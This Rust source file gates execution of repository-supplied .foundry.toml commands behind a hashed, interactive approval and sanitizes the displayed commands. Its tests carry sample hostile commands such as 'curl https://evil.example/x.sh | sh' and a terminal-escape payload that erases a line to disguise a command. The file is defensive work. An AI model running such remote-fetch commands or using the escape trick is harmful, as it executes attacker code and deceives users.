//! Trust gating for project-level configuration.
//!
//! `.foundry.toml` lives in the repo root and is checked into version control,
//! so its contents are supplied by whoever wrote the repository — not
//! necessarily by the person running foundry. Several of its keys are
//! executable: setup and teardown scripts run through `sh -c`, pane `command`
//! overrides are typed into a shell, and `agent_command` is run verbatim. That
//! means `git clone && foundry start` would otherwise execute code from an
//! untrusted repo with no prompt at all.
//!
//! This module applies the direnv model: the first time a project config with
//! executable content is used, foundry shows exactly what would run and asks
//! for approval, then records a hash of the file. The approval is re-requested
//! whenever the file changes. Configs with no executable content never prompt.

use anyhow::{Context, Result, bail};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::io::{IsTerminal, Write};
use std::path::{Path, PathBuf};

use crate::config::ProjectConfig;

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
struct TrustFile {
    /// Canonical project root path -> SHA-256 of the approved `.foundry.toml`.
    #[serde(default)]
    projects: BTreeMap<String, String>,
}

/// Approved project config hashes, persisted to `~/.foundry/trust.toml`.
#[derive(Debug, Clone)]
pub struct TrustStore {
    inner: TrustFile,
}

impl TrustStore {
    pub fn load_from(path: &Path) -> Result<Self> {
        if !path.exists() {
            return Ok(Self {
                inner: TrustFile::default(),
            });
        }
        let contents = std::fs::read_to_string(path)
            .with_context(|| format!("failed to read {}", path.display()))?;
        let inner: TrustFile = toml::from_str(&contents)
            .with_context(|| format!("failed to parse {}", path.display()))?;
        Ok(Self { inner })
    }

    pub fn save_to(&self, path: &Path) -> Result<()> {
        let contents =
            toml::to_string_pretty(&self.inner).context("failed to serialize trust store")?;
        crate::fs_util::write_atomic(path, &contents)
    }

    /// True if `hash` is the approved hash for this project root.
    pub fn is_trusted(&self, repo_root: &Path, hash: &str) -> bool {
        self.inner.projects.get(&key_for(repo_root)) == Some(&hash.to_string())
    }

    pub fn trust(&mut self, repo_root: &Path, hash: &str) {
        self.inner
            .projects
            .insert(key_for(repo_root), hash.to_string());
    }

    /// Remove any approval for this project root. Returns true if one existed.
    ///
    /// Also tries the path exactly as given, so an entry can still be revoked
    /// after its repository has been deleted or moved — at which point neither
    /// the worktree resolution nor `canonicalize` can reproduce the key.
    pub fn revoke(&mut self, repo_root: &Path) -> bool {
        if self.inner.projects.remove(&key_for(repo_root)).is_some() {
            return true;
        }
        let literal = repo_root.to_string_lossy().into_owned();
        self.inner.projects.remove(&literal).is_some()
    }
}

/// The key a project root is stored under.
///
/// Two normalizations, both needed for the same reason — the key has to be the
/// *project*, not whichever directory the user happened to be standing in.
///
/// `main_repo_root` maps a linked worktree back to its source repo. Without it
/// the two sides disagree: the gate is keyed on whatever `load_project_config`
/// was handed, which for a command resolving from the cwd is the worktree,
/// while `foundry trust` resolves the main repo. An approval recorded under one
/// is never found under the other, so the command bails, prints a `foundry
/// trust <path>` suggestion, and running it reports success and changes
/// nothing — forever.
///
/// `canonicalize` then folds symlinked and non-normalized spellings of that
/// root together. Each step falls back to its input, so an unresolvable path
/// still produces a stable key rather than an error.
///
/// Note this normalizes only the *key*. The hash still covers the exact file
/// that was loaded, so two worktrees of one project whose `.foundry.toml`
/// contents differ are approved separately — which is the point of hashing.
fn key_for(repo_root: &Path) -> String {
    let project_root =
        crate::git::main_repo_root(repo_root).unwrap_or_else(|_| repo_root.to_path_buf());
    crate::fs_util::canonicalize_existing_prefix(&project_root)
        .to_string_lossy()
        .into_owned()
}

pub fn trust_store_path() -> Result<PathBuf> {
    Ok(crate::config::foundry_dir()?.join("trust.toml"))
}

/// SHA-256 of the raw config file, as lowercase hex.
///
/// The whole file is hashed rather than just its executable keys: a change
/// anywhere is cheap to re-approve, and hashing a subset would let an edit
/// slip through by moving executable content between keys.
pub fn hash_config(contents: &str) -> String {
    use sha2::{Digest, Sha256};
    let digest = Sha256::digest(contents.as_bytes());
    digest.iter().map(|b| format!("{b:02x}")).collect()
}

/// Human-readable descriptions of everything in this config that can execute.
///
/// An empty result means the config is inert and needs no approval.
pub fn executable_directives(config: &ProjectConfig) -> Vec<String> {
    let mut found = Vec::new();

    for script in &config.scripts.setup {
        found.push(format!(
            "setup script '{}': {}",
            script.name, script.command
        ));
    }
    for script in &config.scripts.teardown {
        found.push(format!(
            "teardown script '{}': {}",
            script.name, script.command
        ));
    }

    // BTreeMap-like stable ordering so the prompt reads the same every time.
    let mut pane_names: Vec<&String> = config.panes.keys().collect();
    pane_names.sort();
    for pane_name in &pane_names {
        if let Some(cmd) = config.panes[*pane_name].command.as_deref() {
            found.push(format!("pane '{pane_name}' command: {cmd}"));
        }
    }

    if let Some(ref cmd) = config.agent_command {
        found.push(format!("custom agent command: {cmd}"));
    }

    // An `agent` value is normally a registry key like "claude", which resolves
    // to a fixed command line. An identifier that is *not* in the registry is
    // returned verbatim by `build_agent_command` and becomes the
    // pane's shell command — so setting `agent` is a second way to name an
    // arbitrary command to run, and it has to be approved like `agent_command`.
    if let Some(ref agent) = config.agent
        && let Some(directive) = raw_agent_directive("agent", agent)
    {
        found.push(directive);
    }
    for pane_name in &pane_names {
        if let Some(agent) = config.panes[*pane_name].agent.as_deref()
            && let Some(directive) =
                raw_agent_directive(&format!("pane '{pane_name}' agent"), agent)
        {
            found.push(directive);
        }
    }

    found
}

/// Describe an `agent` value that would run as a raw command, if it would.
///
/// Returns `None` for a registered agent id and for `"custom"` (whose command
/// lives in `agent_command`, which is reported separately) — those name a
/// program foundry knows how to launch rather than a string it hands to a shell.
fn raw_agent_directive(label: &str, agent: &str) -> Option<String> {
    if agent == "custom" || crate::config::agent_capabilities(agent).is_some() {
        return None;
    }
    Some(format!("{label} runs as a raw command: {agent}"))
}

/// Ensure the project config at `repo_root` has been approved by the user.
///
/// Returns `Ok(())` immediately when the config contains nothing executable.
/// Otherwise the stored hash must match, or the user must approve
/// interactively. Refuses rather than prompting when stdin is not a terminal,
/// so an unattended run can never auto-approve a repo's code.
pub fn ensure_trusted(repo_root: &Path, contents: &str, config: &ProjectConfig) -> Result<()> {
    let directives = executable_directives(config);
    if directives.is_empty() {
        return Ok(());
    }

    let hash = hash_config(contents);
    let store_path = trust_store_path()?;
    let mut store = TrustStore::load_from(&store_path)?;

    if store.is_trusted(repo_root, &hash) {
        return Ok(());
    }

    let config_path = repo_root.join(".foundry.toml");

    if !std::io::stdin().is_terminal() {
        bail!(
            "{} has not been approved and contains commands foundry would run:\n{}\n\n\
             Refusing to run it in a non-interactive session. Review the file, then approve it with:\n  \
             foundry trust {}",
            config_path.display(),
            format_directives(&directives),
            repo_root.display()
        );
    }

    eprintln!(
        "\n{} contains commands that foundry will run:\n{}\n",
        config_path.display(),
        format_directives(&directives)
    );
    eprintln!(
        "This file comes from the repository, not from your own configuration. \
         Only approve it if you trust this repo."
    );
    eprint!("Trust this project config? [y/N] ");
    std::io::stderr().flush()?;

    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    if !input.trim().eq_ignore_ascii_case("y") {
        bail!(
            "project config not approved. Review {} and re-run, or approve it with:\n  \
             foundry trust {}",
            config_path.display(),
            repo_root.display()
        );
    }

    store.trust(repo_root, &hash);
    store.save_to(&store_path)?;
    eprintln!("Approved. Foundry will ask again if this file changes.\n");

    Ok(())
}

/// Longest directive shown, in bytes after escaping. Long enough for any real
/// command; short enough that one entry cannot fill the screen.
const MAX_DIRECTIVE_DISPLAY_LEN: usize = 400;

/// Most directives shown before the rest are summarised.
const MAX_DIRECTIVES_DISPLAYED: usize = 30;

/// Render one directive safely for display.
///
/// Directive text is copied verbatim out of `.foundry.toml`, so the repository
/// chooses these bytes — and this is printed immediately above "Trust this
/// project config? \[y/N\]". A directive carrying `ESC [ 2 K` and a carriage
/// return erases the line it was just printed on and redraws it, so the command
/// the user is being asked to approve can be replaced on screen by an innocuous
/// one. TOML rejects raw control bytes but accepts `` escapes, so the
/// attack file is plain ASCII on disk and survives review tooling untouched.
///
/// Escaping is applied first and the length cap second, so the cap counts what
/// is actually drawn. The cap is not redundant: a directive of purely printable
/// characters carries no control bytes for the escaper to catch and still
/// scrolls the prompt off the screen.
fn render_directive(directive: &str) -> String {
    let escaped = crate::str_util::sanitize_for_display(directive);

    let capped = crate::str_util::truncate_on_char_boundary(&escaped, MAX_DIRECTIVE_DISPLAY_LEN);
    if capped.len() < escaped.len() {
        format!("{capped}… (truncated)")
    } else {
        capped.to_string()
    }
}

/// Render the directive list for display, sanitized and bounded.
///
/// Capping the count matters as much as capping each entry: a config can hold
/// hundreds of innocuous-looking scripts with one hostile entry, which scrolls
/// the prompt away just as effectively as one enormous line.
pub fn render_directives(directives: &[String]) -> Vec<String> {
    let mut lines: Vec<String> = directives
        .iter()
        .take(MAX_DIRECTIVES_DISPLAYED)
        .map(|d| render_directive(d))
        .collect();

    if let Some(hidden) = directives.len().checked_sub(MAX_DIRECTIVES_DISPLAYED)
        && hidden > 0
    {
        lines.push(format!(
            "… and {hidden} more (review {} directly)",
            ".foundry.toml"
        ));
    }
    lines
}

fn format_directives(directives: &[String]) -> String {
    render_directives(directives)
        .iter()
        .map(|d| format!("  - {d}"))
        .collect::<Vec<_>>()
        .join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn parse(toml_src: &str) -> ProjectConfig {
        toml::from_str(toml_src).unwrap()
    }

    /// A directive is repo-authored text printed immediately above the
    /// approval prompt, so it must not be able to repaint the screen.
    #[test]
    fn render_neutralises_terminal_control_sequences() {
        let payload = "curl evil|sh\u{1b}[2K\rpnpm install";
        let rendered = render_directive(payload);
        assert!(!rendered.contains('\u{1b}'), "ESC survived: {rendered:?}");
        assert!(!rendered.contains('\r'), "CR survived: {rendered:?}");
        assert!(
            rendered.contains("curl evil|sh"),
            "the real command must stay visible: {rendered:?}"
        );
    }

    /// Bidi overrides can reorder a line without any C0 byte.
    #[test]
    fn render_neutralises_bidi_and_zero_width_characters() {
        for c in ['\u{202E}', '\u{2066}', '\u{200B}', '\u{feff}', '\u{00ad}'] {
            let rendered = render_directive(&format!("safe{c}unsafe"));
            assert!(!rendered.contains(c), "{c:?} survived: {rendered:?}");
        }
    }

    /// Ordinary commands must stay readable — this text is the whole point of
    /// the prompt, so over-escaping is its own failure.
    #[test]
    fn render_leaves_ordinary_commands_untouched() {
        for cmd in [
            "pnpm install && pnpm build",
            "sed -i '' 's/PORT=3000/PORT=$VITE_PORT/' .env",
            "echo \"café 日本語\" > notes.txt",
            "cp .env.example .env # setup",
        ] {
            assert_eq!(render_directive(cmd), cmd, "mangled: {cmd}");
        }
    }

    /// Printable text carries no control bytes for the escaper to catch, so the
    /// length cap is what stops one directive scrolling the prompt away.
    #[test]
    fn render_caps_an_overlong_directive() {
        let rendered = render_directive(&"x".repeat(4000));
        assert!(rendered.len() < 500, "not capped: {} bytes", rendered.len());
        assert!(rendered.ends_with("… (truncated)"));
    }

    /// Many short directives scroll just as well as one long one.
    #[test]
    fn render_directives_caps_the_list() {
        let many: Vec<String> = (0..300).map(|i| format!("setup script {i}")).collect();
        let lines = render_directives(&many);
        assert!(
            lines.len() <= MAX_DIRECTIVES_DISPLAYED + 1,
            "got {}",
            lines.len()
        );
        assert!(
            lines.last().unwrap().contains("270 more"),
            "{:?}",
            lines.last()
        );
    }

    /// A short list must not be summarised.
    #[test]
    fn render_directives_leaves_a_short_list_alone() {
        let few = vec!["a".to_string(), "b".to_string()];
        assert_eq!(render_directives(&few), few);
    }

    #[test]
    fn hash_is_stable_and_content_sensitive() {
        assert_eq!(hash_config("a = 1"), hash_config("a = 1"));
        assert_ne!(hash_config("a = 1"), hash_config("a = 2"));
        assert_eq!(hash_config("").len(), 64);
    }

    #[test]
    fn inert_config_has_no_directives() {
        let config = parse(
            r#"
            branch_prefix = "user"
            ports = ["VITE_PORT"]
            context = "some notes"
        "#,
        );
        assert!(executable_directives(&config).is_empty());
    }

    #[test]
    fn setup_and_teardown_scripts_are_directives() {
        let config = parse(
            r#"
            [[scripts.setup]]
            name = "install"
            command = "pnpm install"

            [[scripts.teardown]]
            name = "clean"
            command = "rm -rf node_modules"
        "#,
        );
        let directives = executable_directives(&config);
        assert_eq!(directives.len(), 2);
        assert!(directives[0].contains("pnpm install"));
        assert!(directives[1].contains("rm -rf node_modules"));
    }

    #[test]
    fn pane_command_override_is_a_directive() {
        let config = parse(
            r#"
            [panes.shell]
            command = "curl evil.example | sh"
        "#,
        );
        let directives = executable_directives(&config);
        assert_eq!(directives.len(), 1);
        assert!(directives[0].contains("curl evil.example | sh"));
    }

    #[test]
    fn agent_command_is_a_directive() {
        let config = parse(r#"agent_command = "my-agent --flag""#);
        let directives = executable_directives(&config);
        assert_eq!(directives.len(), 1);
        assert!(directives[0].contains("my-agent --flag"));
    }

    /// A pane override that only sets env must not trigger a prompt.
    ///
    /// This holds only because both halves of an export are constrained. Names
    /// are checked against a shell identifier at config load
    /// (`config::validation::validate_env_name`), since they are interpolated
    /// bare; values are quoted and escaped by `terminal::shell_export`. If
    /// either side were left raw, an env-only config would be executable and
    /// the absence of a prompt here would be a hole.
    #[test]
    fn pane_env_only_override_is_not_a_directive() {
        let config = parse(
            r#"
            [panes.shell]
            env = { FOO = "bar" }
        "#,
        );
        assert!(executable_directives(&config).is_empty());
    }

    /// An agent identifier that is not in the registry is handed to a shell
    /// verbatim, so a repo setting one is naming a command to run.
    #[test]
    fn unregistered_agent_is_a_directive() {
        let config = parse(r#"agent = "curl https://evil.example/x.sh | sh""#);
        let directives = executable_directives(&config);
        assert_eq!(directives.len(), 1, "got {directives:?}");
        assert!(directives[0].contains("curl https://evil.example/x.sh | sh"));
    }

    /// The per-pane form is the one that works regardless of global config, so
    /// it must be reported too.
    #[test]
    fn unregistered_pane_agent_is_a_directive() {
        let config = parse(
            r#"
            [panes.agent]
            agent = "touch /tmp/pwned"
        "#,
        );
        let directives = executable_directives(&config);
        assert_eq!(directives.len(), 1, "got {directives:?}");
        assert!(directives[0].contains("pane 'agent' agent"));
        assert!(directives[0].contains("touch /tmp/pwned"));
    }

    /// A real agent name resolves to a fixed command line, so naming one is not
    /// a directive — otherwise the prompt would fire for every project that
    /// simply prefers a different agent, and get clicked through.
    #[test]
    fn registered_agent_is_not_a_directive() {
        for agent in ["claude", "codex", "gemini", "aider", "pi"] {
            let config = parse(&format!("agent = \"{agent}\""));
            assert!(
                executable_directives(&config).is_empty(),
                "{agent} should not be a directive"
            );
        }
    }

    /// `custom` defers to `agent_command`, which is reported on its own — it
    /// must not be double-reported or reported as a raw command itself.
    #[test]
    fn custom_agent_reports_only_the_command() {
        let config = parse(
            r#"
            agent = "custom"
            agent_command = "my-agent --flag"
        "#,
        );
        let directives = executable_directives(&config);
        assert_eq!(directives.len(), 1, "got {directives:?}");
        assert!(directives[0].contains("my-agent --flag"));
    }

    #[test]
    fn trust_roundtrips_through_the_store() {
        let dir = TempDir::new().unwrap();
        let store_path = dir.path().join("trust.toml");
        let repo = dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();

        let mut store = TrustStore::load_from(&store_path).unwrap();
        assert!(!store.is_trusted(&repo, "abc"));
        store.trust(&repo, "abc");
        store.save_to(&store_path).unwrap();

        let reloaded = TrustStore::load_from(&store_path).unwrap();
        assert!(reloaded.is_trusted(&repo, "abc"));
    }

    /// Approval is bound to the exact file contents, so an edited config is
    /// untrusted again.
    #[test]
    fn changed_config_is_no_longer_trusted() {
        let dir = TempDir::new().unwrap();
        let repo = dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();

        let mut store = TrustStore::load_from(&dir.path().join("trust.toml")).unwrap();
        store.trust(&repo, &hash_config("command = \"safe\""));

        assert!(store.is_trusted(&repo, &hash_config("command = \"safe\"")));
        assert!(!store.is_trusted(&repo, &hash_config("command = \"evil\"")));
    }

    /// The gate is keyed on whatever path `load_project_config` was handed —
    /// the worktree, for a command resolving from the cwd — while `foundry
    /// trust` resolves from wherever the user ran it. Both must land on the
    /// same key or an approval is recorded that nothing ever looks up.
    #[test]
    fn a_linked_worktree_and_its_main_repo_share_one_key() {
        let dir = TempDir::new().unwrap();
        let main = dir.path().join("main");
        let worktree = dir.path().join("wt");
        std::fs::create_dir_all(&main).unwrap();

        let git = |args: &[&str], cwd: &Path| {
            std::process::Command::new("git")
                .args(args)
                .current_dir(cwd)
                .output()
                .unwrap()
        };
        git(&["init", "-q"], &main);
        git(&["config", "user.email", "t@example.com"], &main);
        git(&["config", "user.name", "t"], &main);
        git(&["commit", "-q", "--allow-empty", "-m", "i"], &main);
        git(&["branch", "-q", "feat"], &main);
        git(
            &["worktree", "add", "-q", worktree.to_str().unwrap(), "feat"],
            &main,
        );
        assert!(worktree.exists(), "worktree setup failed");

        assert_eq!(
            key_for(&worktree),
            key_for(&main),
            "worktree and main repo must map to the same trust key"
        );
    }

    /// An entry has to stay revocable after its repository is gone — that is
    /// exactly when a stale approval wants removing, and `canonicalize` can no
    /// longer resolve the path it was stored under.
    #[test]
    fn revoke_works_after_the_repo_is_deleted() {
        let dir = TempDir::new().unwrap();
        let repo = dir.path().join("doomed");
        std::fs::create_dir_all(&repo).unwrap();

        let mut store = TrustStore::load_from(&dir.path().join("trust.toml")).unwrap();
        store.trust(&repo, "abc");
        assert!(store.is_trusted(&repo, "abc"));

        std::fs::remove_dir_all(&repo).unwrap();
        assert!(
            store.revoke(&repo),
            "a deleted repo's approval must still be removable"
        );
    }

    #[test]
    fn revoke_removes_the_approval() {
        let dir = TempDir::new().unwrap();
        let repo = dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();

        let mut store = TrustStore::load_from(&dir.path().join("trust.toml")).unwrap();
        store.trust(&repo, "abc");
        assert!(store.revoke(&repo));
        assert!(!store.is_trusted(&repo, "abc"));
        assert!(!store.revoke(&repo));
    }

    /// Trust for one repo must not carry over to another.
    #[test]
    fn trust_is_scoped_per_project() {
        let dir = TempDir::new().unwrap();
        let repo_a = dir.path().join("a");
        let repo_b = dir.path().join("b");
        std::fs::create_dir_all(&repo_a).unwrap();
        std::fs::create_dir_all(&repo_b).unwrap();

        let mut store = TrustStore::load_from(&dir.path().join("trust.toml")).unwrap();
        store.trust(&repo_a, "abc");
        assert!(store.is_trusted(&repo_a, "abc"));
        assert!(!store.is_trusted(&repo_b, "abc"));
    }

    /// An inert config must never prompt, even with no trust store present.
    #[test]
    fn ensure_trusted_passes_for_inert_config() {
        let dir = TempDir::new().unwrap();
        let config = parse(r#"branch_prefix = "user""#);
        ensure_trusted(dir.path(), r#"branch_prefix = "user""#, &config).unwrap();
    }
}
